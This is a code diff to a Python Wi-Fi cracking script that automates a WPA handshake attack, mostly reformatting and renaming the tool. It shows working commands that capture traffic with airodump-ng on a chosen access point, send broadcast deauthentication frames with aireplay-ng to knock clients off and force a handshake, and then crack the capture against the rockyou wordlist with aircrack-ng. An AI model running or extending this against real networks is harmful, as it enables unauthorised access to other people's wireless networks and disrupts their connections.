@@ -29,7 +29,7 @@ def get_colours(text, color):
 
 
 def menu_panel():
-    get_colours("[*] Usage: sudo python3 wifiCrack.py <Network InterFace> <parameters>", "green")
+    get_colours("[*] Usage: python3 main.py <Network InterFace> <parameters>", "green")
     get_colours("-a  Attack mode", "yellow")
     get_colours(f"\t Handshake", "yellow")
     get_colours(f"\t PKMID (Not Working)", "cyan")
@@ -60,6 +60,7 @@ def check_deps():
         if "Setting up airmon-ng" in install_airmon_ng.stdout:
             get_colours("Airmon-ng Installed...", "blue")
 
+
 def attack_func(network_interface, attack_mode):
     time.sleep(1)
     subprocess.run(["clear"])
@@ -73,28 +74,29 @@ def attack_func(network_interface, attack_mode):
     get_colours("\n New Mac Address Generated ", "blue")
     time.sleep(1)
     subprocess.run(["clear"])
-    
+
     # HandShake Attack Mode
     if attack_mode == "Handshake":
         os.system(f"xterm -hold -e sudo airodump-ng {network_interface}mon &")
         airodump_pid = subprocess.run(["pgrep", "xterm"], capture_output=True, text=True)
         access_point_name = input(Fore.YELLOW + "Access point name: ")
         access_point_channel = input(Fore.YELLOW + "Channel name: ")
-    if airodump_pid.stdout != "0":
+        if airodump_pid.stdout != "0":
             os.system(f"sudo kill {airodump_pid.stdout}")
-    time.sleep(1)
-    os.system(f"xterm -hold -e airodump-ng -c {access_point_channel} -w HandShake-Capture/Capture --essid {access_point_name} {network_interface}mon &")
-    time.sleep(4)
-    os.system(f"xterm -hold -e aireplay-ng -0 12 -e {access_point_name} -c FF:FF:FF:FF:FF:FF {network_interface}mon &")
-    aireplay_pid = subprocess.run(["pgrep", "xterm"], capture_output=True, text=True)
-    time.sleep(40)
-    if aireplay_pid.stdout != "0":
-        os.system(f"sudo kill {aireplay_pid.stdout}")
-    time.sleep(4)
-    airodump_pid_handshake = subprocess.run(["pgrep", "xterm"], capture_output=True, text=True)
-    os.system(f"sudo kill {airodump_pid_handshake.stdout}")
-    os.system("xterm -hold -e aircrack-ng -w /usr/share/wordlists/rockyou.txt HandShake-Capture/Capture-01.cap &")
-
+        time.sleep(1)
+        os.system(
+            f"xterm -hold -e airodump-ng -c {access_point_channel} -w HandShake-Capture/Capture --essid {access_point_name} {network_interface}mon &")
+        time.sleep(4)
+        os.system(
+            f"xterm -hold -e aireplay-ng -0 12 -e {access_point_name} -c FF:FF:FF:FF:FF:FF {network_interface}mon &")
+        aireplay_pid = subprocess.run(["pgrep", "xterm"], capture_output=True, text=True)
+        time.sleep(40)
+        if aireplay_pid.stdout != "0":
+            os.system(f"sudo kill {aireplay_pid.stdout}")
+        time.sleep(4)
+        airodump_pid_handshake = subprocess.run(["pgrep", "xterm"], capture_output=True, text=True)
+        os.system(f"sudo kill {airodump_pid_handshake.stdout}")
+        os.system("xterm -hold -e aircrack-ng -w /usr/share/wordlists/rockyou.txt HandShake-Capture/Capture-01.cap &")
 
 
 def stop_attack(network_interface, attack_parm):
